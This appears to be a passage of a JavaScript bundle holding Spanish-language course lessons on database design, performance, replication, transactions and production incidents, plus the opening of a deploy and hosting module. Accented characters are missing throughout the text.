*   **Stored Procedures:** Cdigo que se ejecuta dentro de la DB. Muy rpidos, pero difciles de testear y versionar en Git.

## 4. Pooling de Conexiones
Abrir una conexin a la DB es costoso. No abras una por cada usuario. Usa un **Connection Pool** que mantenga un grupo de conexiones abiertas y las "preste" a los usuarios segn necesiten.

## 5. Explicando la Consulta (\`EXPLAIN\`)
Antes de decir "la base de datos es lenta", usa el comando \`EXPLAIN ANALYZE\`. Te dir exactamente cuntas filas ley y por qu ndices pas.

---

## Proyecto Semi-Senior Final
Disea y escribe las sentencias SQL para un **E-commerce**:
1.  Normaliza hasta la 3ra forma normal (Productos, Categoras, Pedidos, Usuarios).
2.  Escribe una consulta con \`JOIN\` que muestre el total gastado por cada usuario en el ltimo mes.
3.  Agrega ndices a las columnas que consideres crticas.
4.  Escribe una transaccin para el proceso de compra (restar stock + crear pedido).

Excelente! Has pasado de "guardar datos" a convertirte en un profesional de la informacin. 
`,completed:!1,isProject:!0},{id:"db-semi-senior-ejercicios",title:"Ejercicios Prcticos: Semi-Senior",level:"semi-senior",content:`# Ejercicios Prcticos: Bases de Datos Semi-Senior

Estos ejercicios estn diseados para evaluar tu capacidad de modelado relacional, optimizacin de consultas y manejo de integridad de datos.

---

## 1. Desafo de Normalizacin: El Gimnasio
**Contexto:** Tienes un archivo de Excel con una sola pestaa donde se anota todo: \`NombreCliente\`, \`DNI\`, \`Direccion\`, \`NombrePlan\`, \`PrecioPlan\`, \`FechaPago\`, \`EntrenadorAsignado\`.

**Consigna:**
*   Aplica las **3 Formas Normales (1NF, 2NF, 3NF)**.
*   Dibuja el esquema final (tablas y columnas).
*   Justifica por qu separaste los datos de esa manera para evitar anomalas de actualizacin.

---

## 2. SQL Query Master: El E-commerce
**Contexto:** Tienes las tablas \`usuarios\`, \`pedidos\` y \`productos\`.

**Consigna:**
Escribe una sola consulta SQL que devuelva:
1.  Nombre del usuario.
2.  Total de dinero gastado por ese usuario.
3.  Cantidad de pedidos realizados.
*Solo para usuarios que hayan gastado ms de $50,000 acumulados, ordenados de mayor a menor gasto.*

---

## 3. Integridad y Relaciones: Sistema de Permisos
**Contexto:** Debes modelar un sistema donde un \`Usuario\` puede tener mltiples \`Roles\` (Admin, Editor, Viewer), y un \`Rol\` puede pertenecer a mltiples \`Usuarios\`.

**Consigna:**
*   Disea la tabla intermedia necesaria.
*   Escribe el SQL para obtener todos los usuarios que tengan el rol de 'Admin'.
*   Define qu restriccin \`ON DELETE\` usaras para que, si se borra un rol, no se rompa la base de datos.

---

## 4. Performance: El Buscador Lento
**Contexto:** La tabla \`articulos\` tiene 5 millones de registros. La consulta \`SELECT * FROM articulos WHERE titulo LIKE 'Curso%'\` tarda 5 segundos.

**Consigna:**
*   Qu tipo de ndice crearas para mejorar esto?
*   Funcionara un ndice B-Tree normal para un \`LIKE '%Curso%'\` (con el porcentaje al inicio)? Explica por qu.

---

## 5. Transacciones: Transferencia de Puntos
**Contexto:** Un sistema de fidelidad donde un usuario regala puntos a otro.

**Consigna:**
*   Escribe el bloque de cdigo (transaccin) para restar puntos al usuario A y sumarlos al usuario B.
*   Asegura que el usuario A no pueda quedar con puntos negativos (validacin de integridad).

---
`,completed:!1,isProject:!0},{id:"db-semi-senior-evaluacion",title:"Evaluacin Tcnica Semi-Senior",level:"semi-senior",content:`# Evaluacin Final: Bases de Datos Semi-Senior

Esta evaluacin mide tu capacidad para disear, consultar y optimizar bases de datos en entornos profesionales de desarrollo.

## 1. Examen Terico (Conceptos Avanzados)
*   **JOINS:** Explica con un ejemplo real cundo es obligatorio usar un \`LEFT JOIN\` en lugar de un \`INNER JOIN\`.
*   **ACID:** Define qu es la **Atomicidad** y pon un ejemplo de qu pasara si una base de dato no la garantiza.
*   **ndices:** Por qu no es buena idea indexar todas las columnas de una tabla? Explica el impacto en las operaciones de escritura.
*   **Normalizacin:** En qu caso real consideraras **desnormalizar** una tabla (romper las formas normales) a propsito?

## 2. Desafo de Modelado: Sistema de Reservas
Disea las tablas para un sistema de reservas de un **Hotel**.
Debe soportar:
*   Clientes.
*   Habitaciones (con diferentes tipos: Suite, Simple, Doble).
*   Reservas (con fecha de entrada y salida).
*   **Restriccin:** No puede haber dos reservas para la misma habitacin en las mismas fechas. Cmo implementaras esta validacin?

## 3. SQL Prctico: Estadsticas de Blog
Dada una tabla \`posts(id, titulo, autor_id, fecha)\` y \`comentarios(id, post_id, texto)\`:
*   Escribe una consulta que obtenga el ttulo de los 5 posts con ms comentarios.
*   Escribe una consulta que liste a todos los autores que no han escrito ningn post en los ltimos 6 meses.

## 4. Criterios de Aprobacin
* [ ] Dominio de normalizacin hasta 3NF.
* [ ] Capacidad para escribir JOINS y funciones de agregacin (\`COUNT\`, \`SUM\`, \`GROUP BY\`).
* [ ] Entendimiento del concepto de consistencia y transacciones.
* [ ] Criterio tcnico para decidir cundo usar ndices.

---
`,completed:!1,isProject:!0},{id:"db-senior-diseno-modelos-complejos",title:"Diseo de Modelos Complejos",level:"senior",content:`# Leccin 21: Diseo de Modelos Complejos

Como Arquitecto, el diseo de la base de datos no se trata de "dnde pongo este campo", sino de cmo el flujo de datos soportar el crecimiento del negocio a 5 o 10 aos.

## 1. Patrones de Diseo de Esquemas Senior

### Polimorfismo en SQL
Cmo modelamos una tabla \`Comentarios\` que puede pertenecer a un \`Post\`, un \`Video\` o una \`Imagen\`?
*   **Exclusive Belongs To (Class Table Inheritance):** Una columna de FK por cada tipo (\`post_id\`, \`video_id\`), con un constraint que asegure que solo una sea no nula.
*   **Generic Association (Polymorphic Association):** Usar \`commentable_id\` y \`commentable_type\`. Flexible, pero rompe la integridad referencial a nivel de base de datos (no puedes tener FK reales).

### Modelado de Precios y Auditora (Point-in-Time Architecture)
Nunca sobreescribas un precio en un E-commerce. Si un usuario compr ayer a $10 y hoy sube a $12, su factura debe mantener los $10.
*   **Temporal Tables:** Guardar versiones de los registros con \`valid_from\` y \`valid_to\`.
*   **Event Sourcing (Lnea de tiempo):** No guardas el estado actual, guardas todos los eventos que llevaron a ese estado.

## 2. NoSQL: Patrones Avanzados en Documentos

### Extended Reference Pattern
En lugar de solo guardar el \`user_id\` en un \`Pedido\`, guardas el \`user_id\` Y el \`user_name\`. 
*   **Por qu:** Para evitar un JOIN o una segunda consulta solo para mostrar el nombre en el listado de pedidos.
*   **Riesgo:** Inconsistencia si el usuario cambia su nombre (debes decidir si te importa o si corres un worker en background para actualizarlo).

### Attribute Pattern
til para productos con cientos de caractersticas variables (como una tienda de repuestos).
En lugar de tener 500 columnas, usas un array de objetos: \`[{ key: 'color', val: 'rojo' }, { key: 'material', val: 'acero' }]\`. Permite crear ndices sobre las llaves y valores dinmicamente.

---

## Pregunta de Entrevista Senior
*"Tenemos un sistema de suscripciones. Queremos saber exactamente qu plan tena un usuario en cualquier fecha especfica del pasado para resolver una disputa legal. Cmo disearas el esquema para que sea eficiente y auditable?"*

## Desafo Tcnico
Disea el modelo para un sistema de **Notificaciones** (como el de Facebook). Debe soportar:
1. Diferentes tipos de notificaciones (Like, Comentario, Tag).
2. Notificaciones agrupadas ("A Juan y 5 personas ms les gust tu foto").
3. Marcar como ledas individualmente o en bloque.
`,completed:!1},{id:"db-senior-performance-optimizacion",title:"Performance y Optimizacin a Escala",level:"senior",content:`# Leccin 22: Performance y Optimizacin a Escala

A nivel Senior, la "lentitud" no se soluciona comprando un servidor ms grande (Escalabilidad Vertical), sino optimizando el uso de los recursos existentes.

## 1. Cuellos de Botella Comunes

### Latencia de Red vs Latencia de Disco
Muchas veces el problema no es que la consulta tarde mucho, sino que el backend hace 50 consultas pequeas (Round-trips). 
*   **Optimizacin:** Usar **Batching** o **Stored Procedures** para lgica pesada que requiere mltiples pasos, reduciendo la comunicacin entre App y DB.

### Pressure on Memory (Buffer Pool Hit Ratio)
En bases de datos como PostgreSQL o MySQL, los datos se cargan en RAM (Buffer Pool). Si tu "working set" (los datos que ms se consultan) no cabe en RAM, la DB ir al disco, y el performance caer un 90%.
*   **Estrategia:** Reducir el tamao de las filas. Usa \`INT\` en vez de \`BIGINT\` si no vas a tener billones de registros. Usa \`VARCHAR\` ajustados.

## 2. Advanced Caching Strategies

### Write-Through vs Write-Back vs Cache-Aside
1.  **Cache-Aside (Ms comn):** La app busca en Redis. Si no est, busca en la DB y actualiza Redis.
2.  **Write-Through:** La app escribe en la cache y la cache escribe en la DB. Garantiza consistencia.
3.  **Write-Back:** La app escribe solo en la cache. Un proceso asncrono actualiza la DB despus. Ultra rpido pero riesgoso si la cache falla.

## 3. Optimizacin de Lectura: Materialized Views
Si tienes un dashboard con reportes que tardan 10 segundos en cargar, usa una **Materialized View**. A diferencia de una vista normal, esta guarda el resultado fsico en disco.
*   **Trade-off:** Los datos no son en tiempo real. Debes refrescarla (REFRESH MATERIALIZED VIEW) mediante un trigger o un cron.

---

## Caso de Produccin: "El efecto de las 00:00"
Una app de juegos premiaba a los usuarios a medianoche. 1 milln de usuarios entraban al mismo tiempo. El servidor de DB colapsaba por el pico de conexiones.
*   **Solucin Senior:** Implementar un **Queue-based Load Leveling**. Las acciones de los usuarios van a una cola (RabbitMQ/Kafka) y se procesan a un ritmo que la base de datos pueda soportar, convirtiendo un pico de trfico en una carga constante.

## Desafo Tcnico
Usa \`EXPLAIN ANALYZE\` en una consulta compleja de tu eleccin. Identifica si el costo est en un **Sequential Scan** (falta de ndice) o en un **Hash Join** (uniones pesadas). Propn una mejora.
`,completed:!1},{id:"db-senior-indices-avanzados",title:"ndices Avanzados y Planificador de Consultas",level:"senior",content:`# Leccin 23: ndices Avanzados y Planificador de Consultas

Saber que un ndice acelera bsquedas es Junior. Saber *cmo* la base de datos decide usarlo es Senior.

## 1. Tipos de ndices para Expertos

### ndices Parciales (Partial Indexes)
Para qu indexar toda la columna \`status\` si solo nos interesan los registros \`status = 'PENDING'\`?
\`\`\`sql
CREATE INDEX idx_pending_orders ON orders (created_at) WHERE status = 'PENDING';
\`\`\`
*   **Resultado:** El ndice es mucho ms pequeo, cabe mejor en RAM y es ms rpido de actualizar.

### ndices de Cubrimiento (Covering Indexes - INCLUDE)
Si tu consulta pide el \`email\` y el \`nombre\` buscando por \`email\`, puedes incluir el \`nombre\` en el ndice del \`email\`.
\`\`\`sql
CREATE INDEX idx_user_email_include_name ON users (email) INCLUDE (nombre);
\`\`\`
*   **Beneficio:** **Index Only Scan**. La DB no necesita ir a la tabla principal (Heap) para buscar el nombre; ya lo tiene en el ndice.

### ndices GIN y GiST (PostgreSQL)
*   **GIN (Generalized Inverted Index):** El rey para buscar dentro de JSONB o arrays. 
*   **GiST:** Ideal para datos geogrficos (coordenadas) o rangos de tiempo.

## 2. El Planificador de Consultas (Query Planner)
Antes de ejecutar nada, la DB estima el costo de diferentes caminos.
*   **Statistics:** La DB guarda estadsticas sobre qu tan variados son tus datos (Selectividad). Si una columna tiene el mismo valor en el 90% de las filas, el planificador ignorar el ndice porque un Sequential Scan es ms barato.
*   **Index Scans vs Index Only Scans vs Bitmap Scans:** Debes entender la diferencia para diagnosticar por qu una consulta se volvi lenta de repente.

---

## Pregunta de Entrevista Senior
*"Tenemos un ndice en la columna \`created_at\`. Sin embargo, cuando hacemos \`WHERE DATE(created_at) = '2023-10-10'\`, la consulta es lenta y no usa el ndice. Por qu ocurre esto y cmo lo solucionaras?"*
*   **Respuesta esperada:** Usar una funcin sobre la columna indexada invalida el ndice. Solucin: Crear un **Function-based Index** o cambiar la consulta a un rango: \`WHERE created_at >= '2023-10-10' AND created_at < '2023-10-11'\`.

## Desafo Tcnico
Tienes una tabla con 100 millones de registros de logs. Necesitas buscar palabras clave dentro de un campo de texto \`message\`. Un \`LIKE '%error%'\` es inviable. Configura un ndice de **Full Text Search (FTS)** y compara la velocidad.
`,completed:!1},{id:"db-senior-sharding-replicacion",title:"Sharding, Replicacin y Alta Disponibilidad",level:"senior",content:`# Leccin 24: Sharding, Replicacin y Alta Disponibilidad

Cuando una sola base de datos ya no puede ms, el Arquitecto debe pensar en distribuir la carga. No es solo poner ms mquinas, es gestionar la complejidad de la distribucin.

## 1. Replicacin (Lectura masiva)

### Master-Slave (Primary-Replica)
El patrn ms clsico. Todas las escrituras van al **Master**, y las lecturas se reparten entre los **Slaves**.
*   **Problema:** Lag de replicacin. Escribes un dato, refrescas la pgina y no aparece porque la rplica an no se enter.
*   **Solucin Senior:** "Read-your-own-writes" logic. Si el usuario acaba de escribir algo, furzalo a leer del Master por unos segundos.

### Multi-Master
Varios nodos aceptan escrituras. 
*   **Complejidad:** Resolucin de conflictos. Qu pasa si dos personas editan el mismo campo al mismo tiempo en diferentes nodos? (Algoritmos como Vector Clocks o LWW - Last Write Wins).

## 2. Sharding (Escalabilidad Horizontal de Escritura)
Consiste en partir la base de datos fsicamente en mltiples servidores basados en una **Shard Key**.
*   **Horizontal Sharding:** Usuarios de Amrica en el Servidor A, usuarios de Europa en el Servidor B.
*   **Desafo:** Los JOINS entre shards son casi imposibles o extremadamente lentos. Debes disear el sistema para que casi todas las consultas se resuelvan dentro de un solo shard.

## 3. Estrategias de Failover
Si el nodo principal muere, cunto tarda el sistema en recuperarse?
*   **RTO (Recovery Time Objective):** Tiempo que ests offline.
*   **RPO (Recovery Point Objective):** Cuntos datos pierdes (ej: los ltimos 5 segundos de transacciones).
*   **Quorum:** En sistemas distribuidos (como MongoDB o Cassandra), los nodos votan para elegir un nuevo lder.

---

## Caso de Produccin: "La cada de la Shard Key"
Una red social hizo sharding por \`user_id\`. De repente, un usuario famoso con 100 millones de seguidores poste algo. El servidor donde estaba ese usuario colaps por el trfico (Hot Shard), mientras los otros servidores estaban al 5% de carga.
*   **Leccin:** Elegir una Shard Key con alta cardinalidad y distribucin uniforme es vital.

## Desafo Tcnico
Investiga qu es **Vitess** (usado por YouTube) o **Citus** (para Postgres). Explica cmo permiten escalar bases de datos relacionales como si fueran NoSQL.
`,completed:!1},{id:"db-senior-consistencia-disponibilidad",title:"Consistencia, Disponibilidad y el Teorema CAP",level:"senior",content:`# Leccin 25: Consistencia, Disponibilidad y el Teorema CAP

En un sistema distribuido, no puedes tenerlo todo. El Arquitecto debe elegir qu sacrificar basndose en el modelo de negocio.

## 1. El Teorema CAP (Eric Brewer)
Cualquier sistema distribuido solo puede garantizar 2 de estas 3 propiedades:
1.  **Consistencia (C):** Todos los nodos ven los mismos datos al mismo tiempo.
2.  **Disponibilidad (A):** Todas las peticiones reciben una respuesta (xito o error), sin garanta de que sea la ms reciente.
3.  **Tolerancia a Particiones (P):** El sistema sigue funcionando aunque se rompa la comunicacin entre nodos.

> **Importante:** En la web real, la red siempre puede fallar, por lo que la "P" es obligatoria. La eleccin real es **CP** (Bancos) o **AP** (Redes sociales).

## 2. Modelos de Consistencia

### Strong Consistency
Lento pero seguro. El sistema bloquea los datos hasta que todos los nodos estn sincronizados.
### Eventual Consistency (Consistencia Eventual)
Rpido pero incierto. El sistema garantiza que, si no hay ms escrituras, eventualmente todos los nodos tendrn el mismo dato. (Ej: El contador de "likes" en YouTube).

## 3. Estrategias de Resolucin de Conflictos
Si el nodo A dice que el stock es 5 y el nodo B dice que es 4:
*   **CRDTs (Conflict-free Replicated Data Types):** Estructuras de datos inteligentes que se mezclan solas sin conflictos (usado en chats y editores colaborativos como Google Docs).
*   **Quorum Reads/Writes:** Configuras el sistema para que una lectura solo sea vlida si \`N\` nodos estn de acuerdo.

---

## Pregunta de Entrevista Senior
*"Estamos diseando el sistema de inventario para un Flash Sale (tipo Black Friday). Los productos se agotan en segundos. Elegiras un sistema CP o AP? Por qu?"*
*   **Respuesta esperada:** CP (Consistencia y Particin). Es preferible que el sistema sea un poco ms lento o rechace algunas compras (sacrificar Disponibilidad) antes que vender 100 veces un producto que solo tiene 1 unidad en stock (sobreventa).

## Desafo Tcnico
Analiza la base de datos **Cassandra**. En qu parte del tringulo CAP se ubica? Cmo permite configurar el nivel de consistencia (Tunable Consistency) por cada consulta?
`,completed:!1},{id:"db-senior-transacciones-avanzadas",title:"Transacciones Avanzadas y Aislamiento",level:"senior",content:`# Leccin 26: Transacciones Avanzadas y Aislamiento

Ya conoces el concepto ACID. Ahora profundizaremos en por qu la "I" (Aislamiento) es la ms difcil de implementar y la que ms afecta al performance.

## 1. Niveles de Aislamiento (SQL Standard)

Para evitar bloqueos masivos, las DB permiten relajar el aislamiento:
1.  **Read Uncommitted:** Puedes leer datos que otras transacciones an no han confirmado (Dirty Reads). Peligroso pero ultra rpido.
2.  **Read Committed (Por defecto en muchos):** Solo lees datos confirmados. Evita Dirty Reads pero permite Non-repeatable Reads.
3.  **Repeatable Read:** Garantiza que si lees un dato dos veces en la misma transaccin, ser igual.
4.  **Serializable:** El nivel ms alto. Parece que las transacciones se ejecutan una tras otra. Protege contra "Phantom Reads".
    *   **Costo:** Bloqueos masivos de tablas (Lock Contention).

## 2. Distributed Transactions (2PC y Sagas)

Qu pasa si tienes que actualizar saldo en una DB SQL y dar de alta un permiso en una DB NoSQL en la misma operacin?
*   **Two-Phase Commit (2PC):** Un coordinador pregunta a todos los nodos "Estn listos?". Si todos dicen s, se hace el commit. Si uno falla, todos abortan. Es lento y bloqueante.
*   **Sagas Pattern (Recomendado para Microservicios):** Una serie de transacciones locales. Si el paso 3 falla, se ejecutan "Acciones Compensatorias" para deshacer el paso 1 y 2 (borrado lgico).

## 3. Optimistic vs Pessimistic Locking
*   **Pessimistic:** Bloqueas la fila (\`SELECT ... FOR UPDATE\`). Nadie ms puede tocarla hasta que termines. til cuando hay mucha colisin.
*   **Optimistic:** No bloqueas. Al guardar, verificas si alguien cambi el dato mientras t lo tenas (usando una columna \`version\` o \`updated_at\`). Si alguien lo cambi, rechazas la operacin y pides que el usuario reintente.

---

## Caso de Produccin: "Deadlocks en el sistema de Envo"
Dos transacciones intentan actualizar los mismos dos registros en orden inverso.
T1: Bloquea A, intenta bloquear B.
T2: Bloquea B, intenta bloquear A.
Ambas esperan eternamente.
*   **Solucin Senior:** Establecer un orden estricto de acceso a los recursos o usar timeouts agresivos y reintentos automticos.

## Desafo Tcnico
Implementa un mecanismo de **Optimistic Locking** en una tabla de \`Stocks\`. Asegura que si dos procesos intentan restar 1 unidad de una notebook que tiene stock 1, solo uno tenga xito y el otro reciba un error controlado.
`,completed:!1},{id:"db-senior-sql-nosql-produccion",title:"SQL vs NoSQL en Entornos de Produccin Real",level:"senior",content:`# Leccin 27: SQL vs NoSQL en Entornos de Produccin Real

A nivel Senior, la discusin no es "cul es mejor", sino "cul resuelve mejor el problema actual y el del prximo ao". Incluso, la respuesta suele ser **Arquitectura Polglota** (usar varias).

## 1. Cundo SQL sigue siendo invencible
*   **ERP y Sistemas Contables:** Donde la integridad referencial y las transacciones ACID no son opcionales.
*   **Consultas Ad-hoc complejas:** Si tu equipo de Data Science necesita hacer cruces de datos que no conoces de antemano, SQL y sus JOINS son mucho ms flexibles.

## 2. Cundo NoSQL es obligatorio
*   **High Velocity Ingestion:** Si recibes 500,000 eventos de sensores por segundo (IoT), una DB SQL morir intentando mantener los ndices y el esquema. DBs como Cassandra o InfluxDB estn diseadas para esto.
*   **Esquemas Variables:** Si guardas perfiles de usuarios de diferentes redes sociales (unos tienen 'bio', otros 'followers_count', otros 'metadata_json'), NoSQL brilla.

## 3. El auge de las Bases de Datos NewSQL
Son sistemas que intentan dar la escalabilidad de NoSQL con las garantas ACID de SQL.
*   **CockroachDB:** SQL distribuido diseado para sobrevivir a desastres (puedes apagar un datacenter completo y sigue funcionando).
*   **Google Spanner:** Usa relojes atmicos para garantizar consistencia global en una base de datos distribuida en todo el planeta.

## 4. Arquitectura Polglota (Polyglot Persistence)
Un sistema moderno Senior suele verse as:
*   **PostgreSQL:** Para datos maestros (Usuarios, Facturas).
*   **Redis:** Para sesiones y cache de alta velocidad.
*   **ElasticSearch:** Para el buscador del sitio (Bsquedas difusas).
*   **MongoDB:** Para logs de actividad o perfiles dinmicos.

---

## Pregunta de Entrevista Senior
*"Tenemos una aplicacin de mensajera tipo WhatsApp. Dnde guardaras la informacin del perfil del usuario y dnde guardaras el historial de mensajes? Justifica tcnicamente."*
*   **Respuesta Senior:** Perfiles en SQL (datos estructurados, poca frecuencia de cambio). Mensajes en una DB Columnar o de Documentos optimizada para escritura masiva (como Cassandra o ScyllaDB), ya que el volumen de mensajes crecer exponencialmente y no necesitas JOINS entre mensajes.

## Desafo Tcnico
Investiga qu es un **Vector Database** (como Pinecone o Milvus). Explica por qu son vitales para aplicaciones de Inteligencia Artificial y LLMs (RAG).
`,completed:!1},{id:"db-senior-errores-criticos-reales",title:"Errores Crticos y Post-mortems Reales",level:"senior",content:`# Leccin 28: Errores Crticos y Post-mortems Reales

Un Arquitecto Backend se curte en las batallas de produccin. Aprender de los errores de otros es la forma ms barata de ganar experiencia.

## 1. El ndice que mat a Produccin
**Escenario:** Tienes una tabla con 200 millones de filas. Ejecutas un \`CREATE INDEX\` en horario pico.
*   **Error:** Por defecto, esto bloquea todas las escrituras en la tabla hasta que termine (horas).
*   **Solucin Senior:** Usar \`CREATE INDEX CONCURRENTLY\` (en Postgres) o herramientas de migracin Online (como \`gh-ost\` para MySQL). Tarda ms, pero no bloquea el negocio.

## 2. La trampa del "Default Value"
**Escenario:** Agregas una columna \`active BOOLEAN DEFAULT true\` a una tabla masiva.
*   **Error:** En versiones antiguas de DBs, esto rescribe fsicamente cada fila del disco para poner el \`true\`. Resultado: I/O al 100% y site cado por 30 minutos.
*   **Solucin Senior:** Agregar la columna como nullable, y luego correr un script de actualizacin por bloques (batches).

## 3. Agotar el espacio de IDs (Integer Overflow)
**Escenario:** Usaste \`INT\` (32 bits) para el ID de una tabla de Logs que creci ms de lo esperado. Al llegar al registro 2,147,483,647, la DB deja de aceptar registros.
*   **Error:** Disaster recovery de emergencia. Migrar a \`BIGINT\` en una tabla viva de ese tamao es extremadamente complejo.
*   **Solucin Senior:** Empezar siempre con \`BIGINT\` para tablas que sabes que van a crecer, o usar \`UUID\`.

## 4. Olvidar el Timeout en el Pool de Conexiones
**Escenario:** Una consulta lenta se queda pegada. El pool de conexiones se llena de procesos esperando. Nuevos usuarios no pueden entrar.
*   **Solucin Senior:** Configurar estrictamente el \`statement_timeout\` y el \`idle_in_transaction_session_timeout\`. Es mejor que una consulta de un usuario falle por timeout a que todo el sistema colapse para todos.

---

## Caso Real: "El borrado accidental"
Un desarrollador junior confundi la terminal de Testing con la de Produccin y ejecut un \`DROP TABLE\`.
*   **Respuesta del Arquitecto:** No entres en pnico. Si tienes una estrategia de **Point-In-Time-Recovery (PITR)**, puedes restaurar la base de datos al estado exacto que tena un segundo antes del comando fatal usando los logs de transacciones (WAL).
*   **Leccin:** Un backup diario no es suficiente. Necesitas recuperacin por logs.

## Desafo Tcnico
Crea un plan de "Disaster Recovery" para tu proyecto actual. Qu pasa si el proveedor de Cloud desaparece maana? Dnde estn tus backups y cunto tiempo tardaras en estar online de nuevo? (RTO).
`,completed:!1},{id:"db-senior-ejercicios",title:"Ejercicios Prcticos: Arquitectura Senior",level:"senior",content:`# Ejercicios Prcticos: Arquitectura de Bases de Datos Senior

A continuacin presentamos desafos tcnicos de nivel arquitectnico. No se busca solo "que funcione", sino que sea escalable, resiliente y eficiente.

---

## 1. Diseo de Sistema: El Feed de Noticias Global
**Contexto:** Debes disear la base de datos para una red social con 500 millones de usuarios activos. 

**Consigna:**
*   Cmo modelaras las relaciones de "seguido/seguidor" para que la consulta de "obtener posts de la gente que sigo" no tarde segundos?
*   Qu estrategia de Sharding usaras para los posts?
*   Propn una capa de Cache (Redis) y explica qu datos guardaras ah y con qu poltica de expiracin.

---

## 2. Optimizacin: El Reporte de Ventas Agnico
**Contexto:** Una empresa de retail tiene una tabla \`Ventas\` con 1 billn de registros. El reporte mensual de "Ventas por Categora y Regin" antes tardaba 2 minutos y ahora da Timeout.

**Consigna:**
*   Propn una estrategia usando **Materialized Views**.
*   Explica cmo manejaras el refresco de los datos si el negocio pide que el reporte no tenga ms de 1 hora de retraso.
*   Ayudara el **Table Partitioning** (particionamiento por mes)? Justifica cmo lo implementaras.

---

## 3. Transacciones: El Sistema de Envo de Dinero Cripto
**Contexto:** Debes asegurar una transferencia entre un saldo en una base de datos relacional y el registro de una transaccin en una Blockchain (que es asncrona y puede fallar).

**Consigna:**
*   Implementa el patrn **Outbox Pattern** para garantizar que el historial de la transaccin se guarde solo si el saldo se rest correctamente.
*   Explica cmo manejaras el caso donde el servicio de saldo descuenta el dinero pero el servicio de blockchain nunca confirma la transaccin (Acciones Compensatorias).

---

## 4. Consistencia: El Inventario en Black Friday
**Contexto:** Tienes 5 rplicas de lectura y 1 master de escritura. Hay 10 unidades de un iPhone en oferta.

**Consigna:**
*   Explica tcnicamente qu pasara si un usuario ve "Stock: 1" (ledo de una rplica asncrona) pero al intentar comprar el master dice "Stock: 0".
*   Cmo usaras **Pessimistic Locking** (\`SELECT FOR UPDATE\`) para evitar la sobreventa?
*   Qu impacto tiene esto en la disponibilidad (Availability) del sitio?

---

## 5. Migracin: El Cambio de ID
**Contexto:** Tu tabla de \`Usuarios\` usa \`INT\` incremental pero se est agotando. Debes migrarla a \`BIGINT\` sin que el sitio deje de funcionar (Zero Downtime).

**Consigna:**
*   Describe los pasos tcnicos (Batch updates, Triggers de sincronizacin, etc.) para realizar esta migracin en una tabla de 2 billones de registros.

---

Este nivel de pensamiento es lo que diferencia a un programador de un Arquitecto de Software! 
`,completed:!1,isProject:!0},{id:"db-senior-evaluacion",title:"Evaluacin Arquitectura Senior",level:"senior",content:`# Evaluacin Final: Arquitectura de Bases de Datos Senior

Este examen evala tu capacidad para tomar decisiones crticas de infraestructura y diseo de datos bajo presin y a gran escala.

## 1. Escenario de Decisin (Arquitectura)
Tienes un sistema que recibe GPS de 100,000 camiones cada 5 segundos.
*   Qu base de datos elegiras y por qu? (SQL vs NoSQL vs Time-Series).
*   Cmo manejaras la purga de datos antiguos (Retention Policy) para que el disco no se llene?

## 2. Anlisis de Performance
Se te presenta un \`EXPLAIN ANALYZE\` que muestra un "Sort Method: external merge Disk".
*   Qu significa este error?
*   Cmo lo solucionaras cambiando la configuracin de la base de datos o la consulta?

## 3. Transacciones Distribuidas
Explica la diferencia entre el patrn **Two-Phase Commit** y el patrn **Saga**.
*   En qu caso de uso real de un banco usaras cada uno?
*   Cul es ms tolerante a fallos de red?

## 4. Diseo de Resiliencia
Tu base de datos principal est en AWS Virginia (us-east-1). Esta regin se cae por completo.
*   Explica la diferencia entre una rplica **Sncrona** y una **Asncrona** en este contexto.
*   Qu estrategia de "Multi-Region" propondras para un RTO (tiempo de recuperacin) menor a 5 minutos?

## 5. El Teorema CAP aplicado
Un cliente te pide un sistema que sea 100% consistente y 100% disponible incluso si hay una particin de red.
*   Qu le respondes tcnicamente como Arquitecto?

---

## Criterios de Evaluacin Senior
* [ ] Capacidad para justificar trade-offs (ventajas y desventajas) de cada decisin.
* [ ] Dominio de conceptos de bajo nivel (I/O, RAM, Locks).
* [ ] Entendimiento de sistemas distribuidos y consistencia.
* [ ] Enfoque en la continuidad del negocio (Zero Downtime).
* [ ] Conocimiento de patrones de diseo modernos.

Felicidades por completar el camino del Arquitecto de Datos! Tu visin de los sistemas ha cambiado para siempre. 
`,completed:!1,isProject:!0}]},lD={id:"deploy-devops",title:"Deploy & DevOps",description:"Aprende a llevar tus aplicaciones al mundo real, desde hosting esttico hasta infraestructuras en la nube.",completed:!1,lessons:[{id:"deploy-devops-01-que-es-deploy",title:"Qu es el Deploy? De tu compu al mundo",level:"junior",content:`# Leccin 01: Qu es el Deploy? De tu compu al mundo

Muchos programadores terminan su cdigo, funciona en su computadora y dicen: "Listo, termin!". Pero el cdigo solo sirve si otras personas pueden usarlo.

## 1. Qu es el Deploy (Despliegue)?
El **Deploy** es el proceso de mover tu cdigo desde tu computadora personal a un **Servidor** (una computadora que siempre est encendida y conectada a internet) para que cualquiera pueda entrar mediante una URL (ej: \`tu-app.com\`).

## 2. Desarrollo vs. Produccin
A partir de ahora, vas a separar tu vida en dos mundos:
*   **Entorno de Desarrollo (Localhost):** Es tu laboratorio. Aqu el cdigo puede fallar, puedes probar cosas locas y solo t lo ves.
*   **Entorno de Produccin:** Es la vida real. Es donde entran tus usuarios. Aqu el cdigo debe ser estable, rpido y seguro.

## 3. Cmo llega el cdigo all?
Antes, los programadores suban archivos por algo llamado FTP (como mover carpetas a mano). Hoy usamos una forma mucho ms inteligente: **Git**.
T subes tu cdigo a GitHub, y el servidor de produccin "escucha" ese cambio y se actualiza solo.

---

### Concepto Junior:
Hacer "Deploy" no es solo copiar y pegar archivos. Es preparar tu aplicacin para que soporte el trfico de personas reales.

### Ejercicio Mental 1:
Si tienes una red social y borras una lnea de cdigo por error en tu computadora (Desarrollo), se enteran tus usuarios? En qu momento se enteraran?
`,completed:!1},{id:"deploy-devops-02-build-y-hosting",title:'El proceso de "Build" y Static Hosting',level:"junior",content:`# Leccin 02: El proceso de "Build" y Static Hosting

Cuando programas en React, usas archivos modernos que los navegadores viejos no entienden del todo. Por eso, antes de subir tu app, ocurre una transformacin mgica llamada **Build**.

## 1. Qu es el Build?
El comando \`npm run build\` toma todos tus archivos de React, tus imgenes y tu CSS, y los convierte en un solo paquete de archivos HTML, JS y CSS ultra optimizados y pequeos.
*   **Resultado:** Una carpeta llamada \`dist\` o \`build\`. Eso es lo nico que el servidor necesita para mostrar tu web.

## 2. Dnde lo subo? (Vercel y Netlify)
Para proyectos de frontend, usamos plataformas de "Static Hosting". Son geniales porque son gratis para proyectos pequeos y se encargan de todo.
*   **Vercel:** Muy usado para Next.js y React. Conectas tu GitHub y cada vez que haces un \`git push\`, tu web se actualiza en segundos.
*   **Netlify:** Muy similar a Vercel, excelente para sitios estticos y muy fcil de usar.

